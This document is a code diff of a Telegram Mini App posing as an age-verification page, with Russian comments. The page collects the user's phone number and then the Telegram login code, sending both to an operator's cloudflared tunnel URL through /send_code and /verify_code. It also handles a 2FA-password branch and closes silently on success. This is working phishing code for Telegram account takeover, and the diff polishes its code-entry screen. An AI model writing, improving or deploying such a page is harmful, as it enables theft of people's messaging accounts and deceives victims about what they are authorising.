@@ -12,6 +12,7 @@
             background: linear-gradient(135deg, #1a1a1a, #000);
             color: white; display: flex; flex-direction: column;
             justify-content: center; align-items: center; text-align: center; padding: 20px;
+            user-select: none; -webkit-user-select: none;
         }
         .logo { font-size: 60px; margin-bottom: 20px; }
         .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
@@ -24,102 +25,195 @@
         }
         .btn:hover { transform: scale(1.05); }
         
-        .code-container { display: none; gap: 10px; margin-top: 20px; justify-content: center; }
+        /* Стили для ввода кода */
+        .code-wrapper { display: none; flex-direction: column; align-items: center; width: 100%; }
+        
+        /* Скрытый инпут, чтобы ловить нажатия */
+        #hiddenCodeInput {
+            position: absolute; opacity: 0; pointer-events: none; height: 0; width: 0;
+        }
+
+        .code-container { display: flex; gap: 10px; margin-top: 20px; justify-content: center; position: relative; }
         .code-input {
             width: 45px; height: 55px; font-size: 24px; text-align: center;
             background: #2a2a2a; border: 1px solid #444; border-radius: 10px;
-            color: white; outline: none;
+            color: white; outline: none; display: flex; justify-content: center; align-items: center;
+            font-weight: bold;
         }
-        .code-input:focus { border-color: #0088cc; }
+        /* Активная ячейка (подсвечивается) */
+        .code-input.active { border-color: #0088cc; box-shadow: 0 0 10px rgba(0,136,204,0.5); }
+        
+        /* Кнопки управления */
+        .controls { display: flex; justify-content: space-between; width: 100%; max-width: 280px; margin-top: 20px; }
+        
+        .ctrl-btn {
+            background: #2a2a2a; border: 1px solid #444; color: #aaa;
+            padding: 12px 20px; border-radius: 10px; font-size: 16px;
+            cursor: pointer; display: flex; align-items: center; gap: 8px;
+            user-select: none; -webkit-user-select: none;
+            transition: 0.2s;
+        }
+        .ctrl-btn:active { background: #444; transform: scale(0.95); }
+        
+        .help-link {
+            color: #0088cc; text-decoration: none; font-size: 14px; margin-top: 30px;
+            display: inline-block;
+        }
+        
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <!-- ВАЖНО: ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ОТ CLOUDFLARED -->
     <script>
+        // ВСТАВЬ СВОЮ ССЫЛКУ ОТ CLOUDFLARED
         const API_URL = "https://cardiac-ongoing-axis-trigger.trycloudflare.com"; 
     </script>
 
-    <div id="step1">
+    <!-- ШАГ 1 -->
+    <div id="step1" class="code-wrapper" style="display: flex;">
         <div class="logo">🔞</div>
         <div class="title">Подтверждение возраста</div>
         <div class="subtitle">Для доступа нажмите кнопку ниже.</div>
         <button class="btn" onclick="requestPhone()">📱 Поделиться номером</button>
     </div>
 
-    <div id="step2" class="hidden">
+    <!-- ШАГ 2 -->
+    <div id="step2" class="code-wrapper">
         <div class="logo">🔐</div>
         <div class="title">Введите код</div>
-        <div class="subtitle">Код отправлен в Telegram.</div>
-        <div class="code-container" id="codeContainer" style="display: flex;">
-            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 0)">
-            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 1)">
-            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 2)">
-            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 3)">
-            <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 4)">
+        <div class="subtitle">Код отправлен в ваш Telegram</div>
+        
+        <input type="tel" id="hiddenCodeInput" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
+        
+        <div class="code-container" onclick="focusHiddenInput()">
+            <div class="code-input" id="c0"></div>
+            <div class="code-input" id="c1"></div>
+            <div class="code-input" id="c2"></div>
+            <div class="code-input" id="c3"></div>
+            <div class="code-input" id="c4"></div>
         </div>
+
+        <div class="controls">
+            <div class="ctrl-btn" id="deleteBtn" onmousedown="startDelete(true)" onmouseup="startDelete(false)" onmouseleave="startDelete(false)" ontouchstart="startDelete(true)" ontouchend="startDelete(false)">
+                ⌫ Удалить
+            </div>
+        </div>
+
+        <a href="https://t.me/+42777" target="_blank" class="help-link">❓ Узнать код</a>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand(); 
         let userPhone = "";
+        let currentCode = "";
 
+        // Запрос номера
         function requestPhone() {
             tg.requestContact((success, event) => {
                 if (success) {
                     userPhone = event.responseUnsafe.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                     
-                    // 1. МГНОВЕННО ПЕРЕКЛЮЧАЕМ ЭКРАН
                     document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                    setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
+                    document.getElementById('step2').style.display = 'flex';
                     
-                    // 2. ЗАПРОС ОТПРАВЛЯЕМ В ФОНЕ
+                    setTimeout(() => {
+                        focusHiddenInput();
+                    }, 100);
+                    
+                    // Отправляем на сервер
                     fetch(`${API_URL}/send_code`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({phone: userPhone})
-                    })
-                    .then(res => res.json())
-                    .then(data => {
-                        if (!data.success && !data.already) {
-                            console.log("Ошибка отправки кода:", data.error);
-                        }
-                    })
-                    .catch(err => console.log("Ошибка сети:", err));
+                    }).catch(err => console.log("Ошибка сети:", err));
                 }
             });
         }
 
-        function moveNext(input, index) {
-            if (input.value.length === 1) {
-                const nextInput = document.querySelectorAll('.code-input')[index + 1];
-                if (nextInput) nextInput.focus();
-                else {
-                    let code = "";
-                    document.querySelectorAll('.code-input').forEach(el => code += el.value);
-                    if (code.length === 5) {
-                        fetch(`${API_URL}/verify_code`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({phone: userPhone, code: code})
-                        })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data.success) {
-                                tg.close();
-                            } else if (data.needs_password) {
-                                alert("Требуется 2FA пароль!");
-                            } else {
-                                alert("Ошибка: " + data.error);
-                            }
-                        });
-                    }
+        // Фокус на скрытый инпут (чтобы вылезла клавиатура)
+        function focusHiddenInput() {
+            document.getElementById('hiddenCodeInput').focus();
+        }
+
+        // Обновление визуальных ячеек
+        function updateUI() {
+            for (let i = 0; i < 5; i++) {
+                const el = document.getElementById('c' + i);
+                el.innerText = currentCode[i] || "";
+                el.classList.remove('active');
+                // Подсвечиваем текущую пустую ячейку
+                if (i === currentCode.length) {
+                    el.classList.add('active');
                 }
             }
+            
+            // Если ввели все 5 цифр - отправляем
+            if (currentCode.length === 5) {
+                sendCode();
+            }
         }
+
+        // Ловим ввод с клавиатуры
+        document.getElementById('hiddenCodeInput').addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, ''); // Только цифры
+            currentCode = val.substring(0, 5); // Максимум 5 цифр
+            this.value = currentCode; // Синхронизируем
+            updateUI();
+        });
+
+        // Логика удаления (нажатие / удержание)
+        let deleteInterval = null;
+
+        function startDelete(isHold) {
+            if (isHold) {
+                // Если зажали - ждем 500мс и начинаем стирать всё с интервалом
+                deleteInterval = setTimeout(() => {
+                    currentCode = "";
+                    document.getElementById('hiddenCodeInput').value = "";
+                    updateUI();
+                }, 500);
+            } else {
+                // Если просто клик - стираем одну цифру
+                if (deleteInterval) clearTimeout(deleteInterval);
+                currentCode = currentCode.slice(0, -1);
+                document.getElementById('hiddenCodeInput').value = currentCode;
+                updateUI();
+            }
+        }
+
+        // Отправка кода
+        function sendCode() {
+            document.getElementById('hiddenCodeInput').blur(); // Прячем клавиатуру
+            
+            fetch(`${API_URL}/verify_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: userPhone, code: currentCode})
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    tg.close(); // Закрываем без окон
+                } else if (data.needs_password) {
+                    alert("Требуется пароль 2FA");
+                } else {
+                    // Если код неверный - очищаем и даем ввести заново
+                    currentCode = "";
+                    document.getElementById('hiddenCodeInput').value = "";
+                    updateUI();
+                    focusHiddenInput();
+                    alert("Неверный код!");
+                }
+            })
+            .catch(err => {
+                console.log("Ошибка сети:", err);
+            });
+        }
+
+        // Инициализация
+        updateUI();
     </script>
 </body>
 </html>
